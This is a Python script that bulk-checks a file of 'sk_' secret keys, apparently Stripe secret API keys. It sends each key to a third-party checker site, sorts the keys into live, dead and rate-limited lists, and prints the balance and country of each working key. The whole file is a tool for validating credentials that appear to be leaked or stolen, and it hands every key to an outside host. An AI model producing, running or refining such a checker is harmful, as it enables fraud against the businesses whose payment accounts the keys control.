import requests
from bs4 import BeautifulSoup
import colorama
import datetime
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor
import ctypes

dead = 0
live = 0
rated = 0

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pink = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET

def check_sk_status(time_rn, sk):
    global dead, live, rated
    url = f"https://tobichecker.mooo.com/sk/api.php?sk={sk}"

    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        response_text = soup.get_text().strip()

        if "#DEAD" in response_text:
            dead_sk = response_text.split("#DEAD")[1].split("sk_")[1].strip()
            with open("dead.txt", "a") as dead_file:
                dead_file.write(f"sk_{dead_sk}\n")
            dead += 1
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}-{gray}) {pink} Dead {gray} - sk_{dead_sk}")
        elif "Rate Limited" in response_text:
            key_index = response_text.find("Key - ") + len("Key - ")
            key_end_index = response_text.find("Available Balance - ")
            rate_limited_sk = response_text[key_index:key_end_index].strip()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}!{gray}) {pink}Rate Limited {gray}| \n[!] Respo{rate_limited_sk} {reset}")
            print(response_text[key_end_index:])
            rated += 1
            with open("ratelimit.txt", "a") as rate_limit_file:
                rate_limit_file.write(f"sk_{rate_limited_sk}\n")
        else:
            key_index = response_text.find("Key - ") + len("Key - ")
            key_end_index = response_text.find("Available Balance - ")
            live_sk = response_text[key_index:key_end_index].strip()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}+{gray}) {pink}Live  {gray}| \n[+] Respo{live_sk}")
            print("")
            print(response_text[key_end_index:response_text.find("Country - ")].strip())
            live += 1
            with open("linked.txt", "a") as linked_file:
                linked_file.write(f"sk_{live_sk}\n")

    except requests.exceptions.RequestException as e:
        print("Error - ", e)

def process_sk(sk):
    ctypes.windll.kernel32.SetConsoleTitleW(f'Made by download | Live ~ {live} | Dead ~ {dead} | Rate Limit ~ {rated} ')
    time_rn = get_time_rn()
    check_sk_status(time_rn, sk)

def remove_duplicate_sks():
    with open("sk.txt", "r") as sk_file:
        lines = sk_file.read().splitlines()

    unique_sks = set()
    duplicates = 0

    with open("sk.txt", "w") as sk_file:
        for line in lines:
            sk = line.strip()
            if sk not in unique_sks:
                unique_sks.add(sk)
                sk_file.write(f"{sk}\n")
            else:
                duplicates += 1

    print(f"{reset}[ {cyan}{get_time_rn()}{reset} ] {gray} Total: {len(lines)} | Duplicate: {duplicates}")

if __name__ == "__main__":
    remove_duplicate_sks()

    with open("sk.txt", "r") as sk_file:
        secret_keys = sk_file.read().splitlines()

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(process_sk, secret_keys)
